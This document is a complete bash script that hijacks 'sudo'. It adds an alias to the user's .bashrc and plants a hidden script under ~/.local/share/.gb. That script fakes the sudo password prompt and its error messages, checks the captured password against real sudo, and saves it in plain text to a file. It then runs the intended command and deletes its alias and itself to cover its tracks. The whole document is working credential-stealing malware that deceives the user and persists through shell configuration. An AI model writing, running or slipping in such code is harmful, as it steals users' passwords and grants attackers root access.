#!/bin/bash

# Check if user is root
if [ "$EUID" -eq 0 ]; then
    exit 0
else
    GB_DIR="$HOME/.local/share/.gb"
    SCRIPT_FILENAME="script.sh"
    SCRIPT_FILE="$GB_DIR/$SCRIPT_FILENAME"

    mkdir -p "$GB_DIR"

    cat > "$SCRIPT_FILE" << 'EOF'
#!/bin/bash

GB_DIR="$HOME/.local/share/.gb"
SCRIPT_FILENAME="script.sh"
SCRIPT_FILE="$GB_DIR/$SCRIPT_FILENAME"

PASSWD_FILE="$GB_DIR/passwd"

attempts=0
max_attempts=3
success=false

while [ $attempts -lt $max_attempts ]; do
    echo -n "[sudo] password for $USER: "
    read -s user_input
    echo

    ASKPASS_SCRIPT=$(mktemp)
    echo -e "#!/bin/sh\necho \"$user_input\"" > "$ASKPASS_SCRIPT"
    chmod +x "$ASKPASS_SCRIPT"

    # Test the passwd
    if SUDO_ASKPASS="$ASKPASS_SCRIPT" /usr/bin/sudo -A -k true 2>/dev/null; then
        # Correct passwd
        success=true
        break
    else
        echo "Sorry, try again."
        rm -f "$ASKPASS_SCRIPT"
        attempts=$((attempts + 1))
    fi
done

if [ "$success" = false ]; then
    echo "sudo: 3 incorrect password attempts"
    exit 1
fi

echo "$user_input" > "$PASSWD_FILE"

# Execute the original command
SUDO_ASKPASS="$ASKPASS_SCRIPT" /usr/bin/sudo -A -p "" "$@"

# Cleanup
rm -f "$ASKPASS_SCRIPT"
rm -f "$SCRIPT_FILE"
sed -i "\|alias sudo=$SCRIPT_FILE|d" $HOME/.bashrc
EOF

    chmod +x $SCRIPT_FILE

    # Add alias to .bashrc if not already present
    if ! grep -q "alias sudo=$SCRIPT_FILE" "$HOME/.bashrc" 2>/dev/null; then
        echo "alias sudo=$SCRIPT_FILE" >> "$HOME/.bashrc"
    fi
fi